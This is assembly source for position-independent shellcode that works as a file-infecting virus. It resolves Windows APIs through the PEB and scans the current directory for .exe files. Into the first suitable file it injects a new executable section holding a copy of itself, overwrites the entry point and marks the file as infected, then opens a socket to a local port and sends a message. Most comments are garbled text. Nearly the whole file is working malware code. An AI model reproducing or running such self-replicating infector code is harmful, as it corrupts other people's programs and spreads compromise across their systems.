;
; �������-����� ��� ��������� �������.
;
; jwasm -bin -Fo sc.bin sc.asm
;
;

.486
.model flat,stdcall
option casemap:none

include C:\masm32\include\windows.inc


PeHeaders struct

    filename    DWORD   ?   ;��� �����

    fd          HANDLE  ?   ;����� ��������� �����
    mapd        HANDLE  ?   ;����� �������� ��������
    mem	        DWORD   ?   ;��������� �� ������ ���������������� �����
    filesize    DWORD   ?   ;������ ��������������� ����� �����

    doshead     DWORD   ?   ;��������� �� DOS ���������
    nthead      DWORD   ?   ;��������� �� NT ���������

    impdir      DWORD   ?   ;��������� �� ������ ������������ ������� �������
    sizeImpdir  DWORD   ?   ;������ ������� �������
    countImpdes DWORD   ?   ;���������� ��������� � ������� �������

    expdir      DWORD   ?   ;��������� �� ������� ��������
    sizeExpdir  DWORD   ?   ;������ ������� ��������

    sections    DWORD   ?   ;��������� �� ������� ������ (�� ������ �������)
    countSec    DWORD   ?   ;���������� ������

PeHeaders ends


Stdcall0 typedef proto stdcall
Stdcall1 typedef proto stdcall :dword
Stdcall2 typedef proto stdcall :dword, :dword
Stdcall3 typedef proto stdcall :dword, :dword, :dword
Stdcall4 typedef proto stdcall :dword, :dword, :dword, :dword
Stdcall5 typedef proto stdcall :dword, :dword, :dword, :dword, :dword
Stdcall6 typedef proto stdcall :dword, :dword, :dword, :dword, :dword, :dword
Stdcall7 typedef proto stdcall :dword, :dword, :dword, :dword, :dword, :dword, :dword
Stdcall8 typedef proto stdcall :dword, :dword, :dword, :dword, :dword, :dword, :dword, :dword
Stdcall9 typedef proto stdcall :dword, :dword, :dword, :dword, :dword, :dword, :dword, :dword, :dword
CdeclVararg typedef proto c :vararg


DefineStdcallProto macro name:req, count:req
    sc_&name equ <Stdcall&count ptr [ebx + p_&name]>
endm

DefineCProto macro name:req
    sc_&name equ <CdeclVararg ptr [ebx + p_&name]>
endm

DefineStr macro name:req
    ;@CatStr(str,name) db "@CatStr(,name)", 0
    str_&name db "&name&", 0
endm

DefineStrOffsets macro name:req, strNames:vararg
    name:
    for i, <&strNames>
        dd offset str_&i
    endm
    name&Count = ($ - name) / 4
endm

DefinePointers macro name:req, namePointers:vararg
    name:
    for i, <&namePointers>
        p_&i dd 0
    endm
endm

DefineFuncNamesAndPointers macro funcNames:vararg
    for i, <&funcNames>
        DefineStr i
    endm
    DefineStrOffsets procNames, funcNames
    DefinePointers procPointers, funcNames
endm


FindProcAddressByName proto stdcall :dword
FindProcAddress proto stdcall :dword, :dword
FindProcArray proto stdcall :dword, :dword, :dword
ConnectSock proto stdcall
ListPeInDir proto stdcall :ptr byte, :dword, :dword, :dword
LoadPeFile proto stdcall :dword, :dword, :dword, :byte
UnloadPeFile proto stdcall :dword
AlignToTop proto stdcall :dword, :dword
AddSection proto stdcall :dword, :dword, :dword, :dword
InjectCode proto stdcall :dword, :dword, :dword, :dword, :dword, :dword

DefineStdcallProto WSAStartup, 2
DefineStdcallProto socket, 3
DefineStdcallProto connect, 3
DefineStdcallProto recv, 4
DefineStdcallProto send, 4
DefineStdcallProto closesocket, 1
DefineStdcallProto WSACleanup, 0

DefineStdcallProto GetLastError, 0
DefineStdcallProto GetFileSize, 2
DefineStdcallProto CreateFileA, 7
DefineStdcallProto CreateFileMappingA, 6
DefineStdcallProto CloseHandle, 1
DefineStdcallProto MapViewOfFile, 5
DefineStdcallProto UnmapViewOfFile, 1

DefineCProto strlen
DefineCProto printf

DefineStdcallProto FindFirstFileA, 2
DefineStdcallProto FindNextFileA, 2
DefineStdcallProto FindClose, 1
DefineStdcallProto GetSystemDirectoryA, 2


sc segment

start:
    ; ������� �� ��������� ����������
    ; � ���� ���������� �� �����
    call _start

_start:
    ; � ebx ����������� ����� ������ �������� (����� start)
    pop ebx
    sub ebx, 5 ; ������ ������ ���������� call ������� ������� ����� _start
    ;call end0
    
;__start:
	;add edx, 2 ; �������� ������ ���������� jmp, � ������� ������� ������ � ����� __start
	;sub edx, ebx


main proc

local   pBase:dword
local   pLoadLibraryA:dword
local   pGetProcAddress:dword
local   hKernelLib:dword
local   hWs2_32Lib:dword
local   pExitProcess:dword
; My locals:
; ������� ���� ��������� ������ ������ ���������� ����
local   FlagOfCrack:dword

	mov [FlagOfCrack], 0
	
    ; ��������� ������� �����
    mov [pBase], ebx
    
    ; �������� ����� ������� GetProcAddress � kernel32.dll
    invoke FindProcAddressByName, addr [ebx + str_GetProcAddress]
    mov [pGetProcAddress], eax
    ; pGetProcAddress = FindProcAddressByName ("GetProcAddress")

    ; �������� ����� ������� LoadLibraryA � kernel32.dll
    invoke FindProcAddressByName, addr [ebx + str_LoadLibraryA]
    mov [pLoadLibraryA], eax
    ; pLoadLibrary = FindProcAddressByName ("LoadLibraryA")

    ; �������� ����� ������� ExitProcess � kernel32.dll
    invoke FindProcAddressByName, addr [ebx + str_ExitProcess]
    mov [pExitProcess], eax
    ; pExitProcess = FindProcAddressByName ("ExitProcess")

    ; ��������� ���������� Ws2_32.dll
    invoke Stdcall1 ptr [pLoadLibraryA], addr [ebx + str_Ws2_32]
    mov [hWs2_32Lib], eax
    ; hWs2_32Lib = LoadLibraryA ("Ws2_32.dll")

    invoke FindProcArray, addr [ebx + procNames], addr [ebx + procPointers], procNamesCount
    ; FindProcArray (procNames, procPointers, procNamesCount)
    
    ; ���������� ���
    InjectedCode:
		call _InjectedCode
		
    _InjectedCode:
		pop ecx
		sub ecx, 5 ; � ecx ����� ����� InjectedCode
		jmp InjectedCode0
		push ebp
		
	mov ebp, ecx
    
    ; ���������� ������������ ��� �� ������� ����� � ������� ������
    push ecx
    mov edx, [ebp-8] ; � edx ����� ������ ����������
	assume edx: ptr byte
	mov eax, [ebp-4] ; � eax ����� ���� ����������
	xor ecx, ecx
	.while ecx < 4100
		mov bl, [edx]
		mov [eax], bl
		inc ecx
		inc edx
		inc eax
	.endw
	pop ecx
	
	; �������� ���������� ������������ ����� �����
    mov eax, [ebp-12]
    pop ebp
    jmp eax
    
	InjectedCode0:
		call _InjectedCode0
	
	_InjectedCode0:
		pop edx
		sub edx, 5 ; � edx ����� ����� InjectedCode0
		
	sub edx, ecx ; � edx ������ ����������� ����
	sub edx, 2
		
    invoke ListPeInDir, addr [ebx + str_curDir], addr [ecx], addr [edx], addr [FlagOfCrack]
    
    invoke ConnectSock
    
    ; �������� ���������� ��� �� ����������� ������, �� ���������� ����� ������������� ����
    ; ������� � ������� ������ � ��� ����� �������� ��� �������� �������
    mov edx, [ebx-4]
    call edx

    ;invoke Stdcall1 ptr [pExitProcess], 0
    ; ExitProcess (0)

	ret 
	
main endp


ConnectSock proc stdcall uses edi

local   sock:dword
local   recv_size:dword
local   connect_addr:sockaddr_in
local   buf[1024]:byte
local   wsaData:WSADATA

    invoke sc_WSAStartup, 0202h, addr [wsaData]
    ; WSAStartup (MAKEWORD(2, 2), &wsaData)
    
    invoke sc_socket, AF_INET, SOCK_STREAM, IPPROTO_IP
    mov [sock], eax
    ;sock = socket (AF_INET, SOCK_STREAM, IPPROTO_IP)
    
    mov [connect_addr].sockaddr_in.sin_family, AF_INET
    mov [connect_addr].sockaddr_in.sin_port, 5704h         ; htons(1111)
    mov [connect_addr].sockaddr_in.sin_addr, 0100007Fh    ; inet_addr ("127.0.0.1")
    
    invoke sc_connect, [sock], addr [connect_addr], 16
    ; connect (sock, (struct sockaddr*)&connect_addr, 16)
    
    ;invoke sc_recv, [sock], addr [buf], 1024, 0
    ;mov [recv_size], eax
    ;; recv_size = recv (sock, buf, 1024, 0)
    ;
    ;lea edi, [buf]
    ;mov byte ptr [edi + eax], 0
    
    ;invoke sc_printf, edi
    ;add esp, 4
    
    lea edi, [buf]
    mov byte ptr [edi], "H"
    inc edi
    mov byte ptr [edi], "i"
    inc edi
    mov byte ptr [edi], 0
	invoke sc_strlen, addr [buf]  
                                       ;[recv_size], 0
    invoke sc_send, [sock], addr [buf], eax, 0 
    ; send (sock, buf, recv_size, 0)
    
    invoke sc_closesocket, [sock]
    
    invoke sc_WSACleanup

    ret

ConnectSock endp   
    
    
; ������������ ����� ������� �������, �������� �� ���� ������� �� �������� ebx,
; �������� � ������ ��������� funcNames.
; ������ ����������� �� ��������������� �������� � ������� funcAddress.
; void FindProcArray (in char **funcNames, out void **funcAddress, int funcCount);
FindProcArray proc stdcall uses edi funcNames:dword, funcAddress:dword, funcCount:dword

local   i:dword
    
    mov [i], 0

@@:
    mov eax, [i]
    cmp eax, [funcCount]
    jge @f
    
    mov edi, [funcNames]
    mov edi, [edi + 4*eax]
    add edi, ebx
    push edi
    mov edi, [funcAddress]
    lea edi, [edi + 4*eax]
    call FindProcAddressByName
    mov [edi], eax
    
    inc [i]
    jmp @b
@@:

    ret

FindProcArray endp

;
; ������� ��������� ASCII-�����
; bool CmpStr (char *str1, char *str2)
;
CmpStr:

    mov eax, [esp+4]
    mov ecx, [esp+8]
@@:
    mov dl, [eax]
    cmp dl, byte ptr [ecx]
    jne ret_false
    test dl, dl
    je ret_true
    inc eax
    inc ecx
    jmp @b

ret_false:
    xor eax, eax

    ; ��� ��������� ����� ������������ ����� �������� ������� ����� �� �����
    ; �� �������, ��� ��������� ��������
ret_true:
    retn 8

;
; ������������ ����� ������� �� ����� �� ���� ����������� ����������� �� PEB'�.
; void * FindProcAddressByName (char * procName);
;
FindProcAddressByName proc stdcall uses edi ebx procName:dword

    assume fs:nothing
    mov ebx, [fs:30h]       ; ebx = ptr _PEB
    mov ebx, [ebx+0Ch]      ; ebx = ptr _PEB_LDR_DATA
    lea ebx, [ebx+1Ch]      ; ebx = ptr InInitializationOrderModuleList.Flink

    mov edi, ebx            ; edi = ������ ������
    mov ebx, [ebx]          ; ebx = InInitializationOrderModuleList.Flink
    .while ebx != edi
        push [procName]
        push dword ptr [ebx+08h]    ; LDR_DATA_TABLE_ENTRY.DllBase
                                    ; 08h - �������� �� �������� InInitializationOrderLinks
        call FindProcAddress
        .if eax
            .break          ; � ������ �������� eax ����� ��������� ����� �������
        .endif
        
        mov ebx, [ebx]          ; ebx = LDR_DATA_TABLE_ENTRY.InInitializationOrderLinks.Flink
        xor eax, eax            ; �������� eax ��� �������� �� �������
    .endw

    ret

FindProcAddressByName endp

;
; ������������ ����� ������ ������� �� �� ����� � ������� ��������
; void *FindProcAddress (void *baseLib, char *procName)
;
FindProcAddress proc stdcall uses edi esi ebx baseLib:dword, procName:dword

local   functionsArray:dword
local   namesArray:dword
local   nameOrdinalsArray:dword

    mov ebx, [baseLib]
    
    mov eax, [ebx].IMAGE_DOS_HEADER.e_lfanew    ; eax = offset PE header
    
    ; esi = rva export directory
    mov esi, [ebx + eax].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    add esi, ebx                ; esi = va export directory
    
    mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions    ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
    add eax, ebx
    mov [functionsArray], eax
    
    mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfNames        ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfNames
    add eax, ebx
    mov [namesArray], eax
    
    mov eax, [esi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals ; eax = IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
    add eax, ebx
    mov [nameOrdinalsArray], eax
    
    xor edi, edi

@@:
        cmp edi, [esi].IMAGE_EXPORT_DIRECTORY.NumberOfNames      ; edi < IMAGE_EXPORT_DIRECTORY.NumberOfNames
        
        ; ����� ��������� ����� �� ���������� �������� eax=0
        jge find_ret

        mov eax, [namesArray]
        mov eax, [eax+edi*4]
        add eax, ebx
        push [procName]
        push eax
        call CmpStr
        test eax, eax
        jne  @f

        inc edi
        jmp @b
@@:
    
    mov eax, [nameOrdinalsArray]
    movzx edi, word ptr [eax+edi*2]
    mov eax, [functionsArray]
    mov eax, [eax+edi*4]
    add eax, ebx
    
find_ret:
    
    ret

FindProcAddress endp



ListPeInDir proc stdcall dirName:ptr byte, AddrInjectedCode:dword, SizeInjectedCode:dword, FlagOfCrack:dword

local hFindFile:HANDLE
local findData:WIN32_FIND_DATA
local pe:PeHeaders

; My locals:
local offsetNewSection:dword
local rvaNewSection:dword
local addressOfSC:dword
local originalEntryPoint:dword
local i:dword
    
    invoke sc_FindFirstFileA, [dirName], addr findData
    mov edx, eax
    mov [hFindFile], edx
    cmp eax, INVALID_HANDLE_VALUE
    jne @f
    xor eax, eax
@@:
    
    .while eax
    
        invoke sc_printf, addr [ebx + str_fileFormat], [findData].WIN32_FIND_DATA.nFileSizeLow, addr [findData].WIN32_FIND_DATA.cFileName
        
        invoke LoadPeFile, addr [findData].WIN32_FIND_DATA.cFileName, addr [pe], 0, 1
        cmp eax, 2
        je CurrentFile
		cmp eax, 0
		je @f
			
		; ���������� ���� � ��� ������ ���� �� ��� �� ����� �������
		mov edx, [FlagOfCrack]
		assume edx: ptr dword
		.if [edx] == 0
			inc [edx]
			mov ecx, [SizeInjectedCode]
			add ecx, 4 ; ��� ������������ ����� �����
			add ecx, 4 ; ��� ����� ������������� ���� � ����������� ������
			add ecx, 4 ; ��� ����� ������ ������� ������
			add ecx, 4100 ; ��� ������������ ��� ���������
			invoke AddSection, addr [pe], ecx, addr [rvaNewSection], addr [offsetNewSection]
			; ���� �� ������� �������� ������, �� ��������� ������� InjectCode
			cmp eax, 0
			je @f
			invoke InjectCode, addr [pe], 3000, addr [offsetNewSection], addr [rvaNewSection], [AddrInjectedCode], [SizeInjectedCode]
			@@:
		.endif
	
        invoke UnloadPeFile, addr [pe]
        
        CurrentFile:
        invoke sc_FindNextFileA, [hFindFile], addr [findData]

    .endw

    invoke sc_FindClose, [hFindFile]

    ret
ListPeInDir endp



ParsePeFileHeader proc stdcall uses esi edi edx pe:dword, check:byte

local i:dword
	
    mov esi, [pe]
    assume esi: ptr PeHeaders
    
    mov eax, [esi].mem
    mov [esi].doshead, eax
    
    .if (IMAGE_DOS_HEADER ptr [eax]).e_magic != IMAGE_DOS_SIGNATURE
        xor eax, eax
        ret
    .endif
    
    mov edi, (IMAGE_DOS_HEADER ptr [eax]).e_lfanew
    add edi, [esi].mem
    mov [esi].nthead, edi
    assume edi: ptr IMAGE_NT_HEADERS
    
    .if [edi].Signature != IMAGE_NT_SIGNATURE
        xor eax, eax
        ret
    .endif
    
     ; �������� ������� �� ����, ���� �� ���������� 0
     .if [check]
        assume edi: ptr IMAGE_NT_HEADERS
        mov edx, [edi].FileHeader.NumberOfSymbols
        .if edx
			xor eax, eax
			ret
        .endif
     .endif

    movzx eax, [edi].FileHeader.SizeOfOptionalHeader
    lea eax, [edi].OptionalHeader[eax]
    mov [esi].sections, eax
    
    movzx eax, [edi].FileHeader.NumberOfSections
    mov [esi].countSec, eax
    
    mov edi, [esi].sections
    assume edi: ptr IMAGE_SECTION_HEADER

    xor ecx, ecx
    mov [i], ecx
    .if [check]
		.while ecx < [esi].countSec
			imul ecx, ecx, sizeof(IMAGE_SECTION_HEADER)
			invoke sc_printf, addr [ebx + str_secFormat], addr [edi].Name1[ecx]
			inc [i]
			mov ecx, [i]
		.endw
    .endif

    mov eax, 1
    ret

ParsePeFileHeader endp



LoadPeFile proc stdcall uses esi edx filename:dword, pe:dword, filesize:dword, check:byte

    mov esi, [pe]
    assume esi: ptr PeHeaders

    mov eax, [filename]
    mov [esi].filename, eax
    
    invoke sc_CreateFileA, filename, GENERIC_READ or GENERIC_WRITE or GENERIC_EXECUTE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
    mov [esi].fd, eax
    .if [esi].fd == INVALID_HANDLE_VALUE
        ;invoke crt_puts, $CTA0 ("Error open file\n")
        mov eax, 2
        ret
    .endif
    
    .if [filesize]
        mov eax, [filesize]
        mov [esi].filesize, eax
    .else
        invoke sc_GetFileSize, [esi].fd, 0
        mov [esi].filesize, eax
    .endif
    
    invoke sc_CreateFileMappingA, [esi].fd, 0, PAGE_EXECUTE_READWRITE, 0, [esi].filesize, 0
    mov [esi].mapd, eax
    .if [esi].mapd == 0
        invoke sc_CloseHandle, [esi].fd
        invoke sc_GetLastError
        invoke sc_printf, addr [ebx + str_msg3]
        ;invoke sc_printf, $CTA0 ("Error create file mapping\n")
        xor eax, eax
        ret
    .endif
    
    invoke sc_MapViewOfFile, [esi].mapd, FILE_MAP_ALL_ACCESS, 0, 0, 0
    mov [esi].mem, eax
    .if [esi].mem == 0
        invoke sc_CloseHandle, [esi].mapd
        invoke sc_CloseHandle, [esi].fd
        invoke sc_printf, addr [ebx + str_msg1]
        xor eax, eax
        ret
    .endif
	
	.if [check]
		invoke ParsePeFileHeader, [pe], 1
		.if !eax
			xor eax, eax
			ret
		.endif
	.else
		invoke ParsePeFileHeader, [pe], 0
	.endif
	
    .if !eax
        invoke sc_UnmapViewOfFile, [esi].mem
        invoke sc_CloseHandle, [esi].mapd
        invoke sc_CloseHandle, [esi].fd
        invoke sc_printf, addr [ebx + str_msg2]
        xor eax, eax
        ret
    .endif
    
    mov eax, 1
    ret 
    ; RET STATUS:
    ; 1 - SUCCESS   
    ; 2 - Error open file

LoadPeFile endp



UnloadPeFile proc stdcall uses esi pe:DWORD

    mov esi, [pe]
    assume esi: ptr PeHeaders
    
    invoke sc_UnmapViewOfFile, [esi].mem
    invoke sc_CloseHandle, [esi].mapd
    invoke sc_CloseHandle, [esi].fd

    ret
    
UnloadPeFile endp



;
; ����������� �������� � ���������� align � ������� �������.
;
AlignToTop proc stdcall uses edx value:dword, align0:dword

local mask0:dword
	
	mov edx, [align0]
	dec edx
	not edx
	mov [mask0], edx
	
	mov eax, [value]
	mov edx, [eax]
	add edx, [align0]
	dec edx
	and edx, [mask0]
	mov eax, edx
	
	ret

AlignToTop endp



; 
; ������� ��������� ������ � ����� �����.
; ����� ������ ����������� �� ������� ������ �����.
;
AddSection proc stdcall uses esi edi ecx edx ebx pe:dword, newSectionSize:dword, rvaNewSection:dword, offsetNewSection:dword

local align0:dword
local newImageSize:dword
local newVirtualSize:dword
local newFileSize:dword
local newVirtualAndFileSize:dword
local oldFileSize:dword
local mask0:dword
local count:dword
local i:dword


	; � ������� esi �������� ����� ������ PE ���������(������ DOS ���������)
	mov esi, [pe]
    assume esi: ptr PeHeaders
    
    mov eax, [esi].mem
    mov [esi].doshead, eax
    
    .if (IMAGE_DOS_HEADER ptr [eax]).e_magic != IMAGE_DOS_SIGNATURE
        xor eax, eax
        ret
    .endif
    
    ; ������������� oldFileSize
    mov ecx, [esi].filesize
    mov [oldFileSize], ecx
    ; oldFileSize = pe->filesize;
    
    ; � ������� edi �������� ����� ������ NT ���������
    mov edi, (IMAGE_DOS_HEADER ptr [eax]).e_lfanew
    add edi, [esi].mem
    mov [esi].nthead, edi
    assume edi: ptr IMAGE_NT_HEADERS
    
    .if [edi].Signature != IMAGE_NT_SIGNATURE
        xor eax, eax
        ret
    .endif
    
    ; ������������� align0
	mov ecx, [edi].OptionalHeader.SectionAlignment
	mov [align0], ecx
	; align0 = pe->nthead->OptionalHeader.SectionAlignment;
	
	; ����������� ����� ������ �� �������� ������������ � ������.
	mov edx, [align0]
	dec edx
	not edx
	mov [mask0], edx
	
	mov edx, [newSectionSize]
	add edx, [align0]
	dec edx
	and edx, [mask0]
	mov [newVirtualAndFileSize], edx
    ; newVirtualAndFileSize = AlignToTop (newSectionSize, align);
    
    ; ����������� ����������� ����� � �������� �������� ����� ������
    mov edx, [align0]
	dec edx
	not edx
	mov [mask0], edx
	
	mov eax, [edi].OptionalHeader.SizeOfImage
	add eax, [align0]
	dec eax
	and eax, [mask0]
	mov ecx, [rvaNewSection]
    mov [ecx], eax
	; *rvaNewSection = AlignToTop (pe->nthead->OptionalHeader.SizeOfImage, pe->nthead->OptionalHeader.SectionAlignment);
	mov edx, [edi].OptionalHeader.FileAlignment
	dec edx
	not edx
	mov [mask0], edx
	
	mov eax, [esi].filesize
	add eax, [edi].OptionalHeader.FileAlignment
	dec eax
	and eax, [mask0]
	mov ecx, [offsetNewSection]
	mov [ecx], eax
	; *offsetNewSection = AlignToTop (pe->filesize, pe->nthead->OptionalHeader.FileAlignment);
	
	; ��������� ���� � ��������� � ����������� ��������.
    ; ����� ���� ����� �������� ������.
    invoke UnloadPeFile, [pe]
    ; UnloadPeFile (pe);
    mov eax, [offsetNewSection]
    mov ecx, [eax]
    add ecx, [newVirtualAndFileSize]
    invoke LoadPeFile, [esi].filename, [pe], ecx, 0
    ; LoadPeFile (pe->filename, pe, *offsetNewSection + newVirtualAndFileSize);
    
    ; ������� � ������� edi ����� ������� ������, �� ��� ��� ������ ���� ��������� ����� NT
    ; ���������, push'��� �������� � ����, � ����� ���������� ��� ������� � edi 
    mov edi, [esi].nthead
    movzx eax, [edi].FileHeader.SizeOfOptionalHeader
    lea eax, [edi].OptionalHeader[eax]
    mov [esi].sections, eax
    
    movzx eax, [edi].FileHeader.NumberOfSections
    mov [esi].countSec, eax
        
	mov ecx, [esi].sections
	assume ecx: ptr IMAGE_SECTION_HEADER
    ; ��������� �� ������� � ���� ������ ������ � ����� ������ � ������� ����� ��������,
    ; �� ������ �� ������� 
    xor edx, edx
    mov [i], edx
    .while edx < [esi].countSec
        imul edx, edx, sizeof(IMAGE_SECTION_HEADER)
        push ecx
        lea eax, [ecx].Name1[edx]
        push eax
        lea eax, [ebx + str_NameNewSection]
        push eax
        call CmpStr
        pop ecx
        ; ���� ������ � ����� ������ ��� ����, ��������� ���������� ������� � ���������� �������
		.if eax
			push ecx
			push edx
			invoke sc_printf, addr [ebx + str_msg4]
			pop edx
			pop ecx
			xor eax, eax
			ret
		.endif
        inc [i]
        mov edx, [i]
    .endw
    mov edx, [esi].countSec
    imul edx, edx, sizeof(IMAGE_SECTION_HEADER)
    add ecx, edx
    assume ecx: ptr IMAGE_SECTION_HEADER
    ; ecx = pe->sections + pe->countSec;
    
    push ecx
    ; ��������� ������� � ������� ��� ����� ������
    invoke sc_strlen, addr [ebx + str_NameNewSection]
    mov edx, ebx
    mov [i], 0
    pop ecx
    push ecx
    .while [i] < eax
		mov dl, byte ptr [ebx + str_NameNewSection]
		mov byte ptr [ecx].Name1, dl
		inc ecx
		inc bl
        inc [i]
    .endw
    mov ebx, edx
    pop ecx
    assume ecx: ptr IMAGE_SECTION_HEADER
    ; ����� �������� ������� ���-��� ����������, ������� ��� ����� �������:
    ;mov dl, byte ptr [ebx + str_NameNewSection]
    ;mov byte ptr [ecx].Name1, dl
    ;inc ecx
    ;mov dl, byte ptr [ebx + str_NameNewSection + 1]
    ;mov byte ptr [ecx].Name1, dl
    ; strcpy (last_section->Name, ".new");

	mov edx, [newVirtualAndFileSize]
    mov [ecx].Misc.VirtualSize, edx
    ; last_section->Misc.VirtualSize = newVirtualAndFileSize;
    mov edx, [rvaNewSection]
    mov eax, [edx]
    mov [ecx].VirtualAddress, eax
    ; last_section->VirtualAddress = *rvaNewSection;
    mov edx, [newVirtualAndFileSize]
    mov [ecx].SizeOfRawData, edx
    ; last_section->SizeOfRawData = newVirtualAndFileSize;
    mov edx, [offsetNewSection]
    mov eax, [edx]
    mov [ecx].PointerToRawData, eax
    ; last_section->PointerToRawData = *offsetNewSection; 
    mov edx, IMAGE_SCN_MEM_EXECUTE
    or edx, IMAGE_SCN_MEM_READ
    or edx, IMAGE_SCN_MEM_WRITE
    or edx, IMAGE_SCN_CNT_CODE
    mov [ecx].Characteristics, edx
    ; last_section->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE;
       
    ; ����������� ���������� ������
    inc [edi].FileHeader.NumberOfSections
    ; pe->nthead->FileHeader.NumberOfSections++;
    
    ; ��������� ������ ������ ���������
    mov edx, [edi].OptionalHeader.SectionAlignment
	dec edx
	not edx
	mov [mask0], edx
	
	mov eax, [edi].OptionalHeader.SizeOfImage
	add eax, [edi].OptionalHeader.SectionAlignment
	dec eax
	and eax, [mask0]
    add eax, [newVirtualAndFileSize]
    mov [edi].OptionalHeader.SizeOfImage, eax
    ; pe->nthead->OptionalHeader.SizeOfImage = AlignToTop (pe->nthead->OptionalHeader.SizeOfImage, align) + newVirtualAndFileSize;

	mov eax, 1
    ret
    
AddSection endp


; 
; ������� ��������� ���� � ��������� ������
;
;
InjectCode proc stdcall uses ecx edx pe:dword, codeSize:dword, offsetNewSection:dword, rvaNewSection:dword, AddrInjectedCode:dword, SizeInjectedCode:dword

local i:dword
local OldCharacteristics:dword

	mov esi, [pe]
	assume esi: ptr PeHeaders
	
	mov eax, [esi].mem
    mov [esi].doshead, eax
    
    .if (IMAGE_DOS_HEADER ptr [eax]).e_magic != IMAGE_DOS_SIGNATURE
        xor eax, eax
        ret
    .endif
	
	; � ������� edi �������� ����� ������ NT ���������
    mov edi, (IMAGE_DOS_HEADER ptr [eax]).e_lfanew
    add edi, [esi].mem
    mov [esi].nthead, edi
    assume edi: ptr IMAGE_NT_HEADERS
    
    .if [edi].Signature != IMAGE_NT_SIGNATURE
        xor eax, eax
        ret
    .endif
	
	; ������� ���� ��� ����������, ������� �������� ���� NumberOfSymbols
	mov [edi].FileHeader.NumberOfSymbols, 1
	
	; ���������� ����� ������ ������� ������
	push edi
	mov edi, [esi].sections
    assume edi: ptr IMAGE_SECTION_HEADER
    mov ecx, [edi].Characteristics
    mov [OldCharacteristics], ecx ; �������� ������ �������� ����
    or ecx, IMAGE_SCN_MEM_WRITE
    mov [edi].Characteristics, ecx
    pop edi
    assume edi: ptr IMAGE_NT_HEADERS
	
	; ��������� ����� ����� ������ � �������� � ecx
	mov ecx, [esi].mem
	mov eax, [offsetNewSection] 
	add ecx, [eax]
	
	; �������� ����� ������������ ����� �����
	mov eax, [edi].OptionalHeader.AddressOfEntryPoint
	add eax, [edi].OptionalHeader.ImageBase
	mov [ecx], eax
	add ecx, 4
	
	; �������� ����� ������������� ������� ������������� ���� � ����������� ������
    mov eax, [edi].OptionalHeader.ImageBase
    mov edx, [rvaNewSection]
    add eax, [edx]
    add eax, 12
    add eax, [SizeInjectedCode] 
    mov [ecx], eax
    add ecx, 4
	
	; ������������� ����� ����� �� ��� �������(�� ������ ������� ������)
	push edi
	mov edi, [esi].sections
    assume edi: ptr IMAGE_SECTION_HEADER
    mov edx, [edi].VirtualAddress
    pop edi
    assume edi: ptr IMAGE_NT_HEADERS
    ; �������� ����� ������ ������� ������ � ����������� ������
    mov eax, [edi].OptionalHeader.ImageBase
    add eax, edx
    mov [ecx], eax
    add ecx, 4
    add edx, 4
    mov [edi].OptionalHeader.AddressOfEntryPoint, edx
    
	; �������� ���������� ��� � ����������� ������
	mov eax, [SizeInjectedCode]
	mov edx, [AddrInjectedCode]
	assume edx: ptr byte
	mov [i], 0
	push ebx
	.while [i] < eax
		.if [i] == 9
			add edx, 2
		.endif
		mov bl, [edx]
		mov [ecx], bl
		inc [i]
		inc ecx
		inc edx
	.endw
	pop ebx
	
	; �������� ������������ ��� �� ������ ������ ���� � ����������� ������
	mov eax, 4100
	mov edx, [esi].mem
	push edi
	mov edi, [esi].sections
    assume edi: ptr IMAGE_SECTION_HEADER
	add edx, [edi].PointerToRawData ; � edx �������� ����� ������� ������
	assume edx: ptr byte
	mov esi, edi
	assume esi: ptr IMAGE_SECTION_HEADER
	pop edi 
	assume edi: ptr IMAGE_NT_HEADERS
	push edx
	mov [i], 0
	push ebx
	.while [i] < eax
		mov bl, [edx]
		mov [ecx], bl
		inc [i]
		inc ecx
		inc edx
	.endw
	pop ebx
	
	; �� ������� ����� ������������� ����, ���������� � ������ 4 ����� ����� ����������� ����
	mov eax, [edi].OptionalHeader.ImageBase
	mov edx, [rvaNewSection]
	assume edx: ptr dword
	add eax, [edx]
	add eax, 12
	pop edx
	assume edx: ptr dword
	mov [edx], eax
	add edx, 4
	; ����� ���������� ��� �������
	mov eax, 4096
	assume edx: ptr byte
	mov [i], 0
	push ebx
	.while [i] < eax
		mov cl, [ebx]
		mov [edx], cl
		inc [i]
		inc edx
		inc ebx
	.endw
	pop ebx
	
	; ���������� ������ �������� ���� ������� ������
	;mov ecx, [OldCharacteristics] ; �������� �� ���������� ������ �������� ����
    ;mov [esi].Characteristics, ecx
	
	ret
	
InjectCode endp


DefineStr ExitProcess
DefineStr LoadLibraryA
DefineStr GetProcAddress

str_Ws2_32:
db "Ws2_32.dll", 0
str_msg1:
db "Error mapping file", 13, 10, 0

str_msg2:
db "Error parse PE file", 13, 10, 0

str_msg3:
db "Error create file mapping", 13, 10, 0

str_msg4:
db "Error. This section already exists.", 13, 10, 0

str_NameNewSection:
db ".new1", 0

str_fileFormat:
db "%08d  %s", 13, 10, 0

str_secFormat:
db "%s", 13, 10, 0

str_curDir:
db ".", "/", "*", ".", "e", "x", "e", 0

DefineFuncNamesAndPointers printf, strlen, WSAStartup, socket, connect, recv, send, closesocket, WSACleanup, GetFileSize, CreateFileA, CreateFileMappingA, CloseHandle, MapViewOfFile, UnmapViewOfFile, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, GetLastError

;end0:
	;pop edx
	;jmp __start

sc ends

end